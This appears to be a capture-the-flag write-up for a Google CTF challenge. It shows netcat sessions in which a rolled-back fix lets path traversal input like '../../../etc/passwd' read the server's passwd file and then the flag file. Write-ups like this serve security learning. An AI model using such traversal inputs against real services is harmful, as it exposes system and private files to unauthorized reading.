# ADMIN UI
PWN-RE

## Description:
> The command you just found removed the Foobanizer 9000 from the DMZ. While scanning the network, you find a weird device called Tempo-a-matic. According to a Google search it's a smart home temperature control experience. The management interface looks like a nest of bugs. You also stumble over some gossip on the dark net about bug hunters finding some vulnerabilities and because the vendor didn't have a bug bounty program, they were sold for US$3.49 a piece. Do some black box testing here, it'll go well with your hat.
> 
> nc mngmnt-iface.ctfcompetition.com 1337

## Solution:

Connecting to the provided server provides us the following service:
```
root@kali:/media/sf_CTFs/google/adminui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

Let's read the release notes:
```
root@kali:/media/sf_CTFs/google/adminui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
Version0.2
# Release 0.2
 - Updated library X to version 0.Y
 - Fixed path traversal bug
 - Improved the UX
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
Version0.3
# Version 0.3
 - Rollback of version 0.2 because of random reasons
 - Blah Blah
 - Fix random reboots at 2:32 every second Friday when it's new-moon.
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
 ```

 So version 0.2 fixed a path traversal vulnerability and version 0.3 reverted the fix.

 Let's start looking for a known file:
 ```
 === Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../etc/passwd
Error: No such file or directory
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../etc/passwd
Error: No such file or directory
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
user:x:1337:1337::/home/user:
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
 ```

 We found /etc/password at the following relative path: `../../../etc/passwd`.

 We also can guess that our user's home directory is `/home/user`, based on the last entry of the file.

 From there, we can find the flag with a bit of guessing:
 ```
root@kali:/media/sf_CTFs/google/adminui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../home/user/flag
CTF{I_luv_buggy_sOFtware}=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
 ```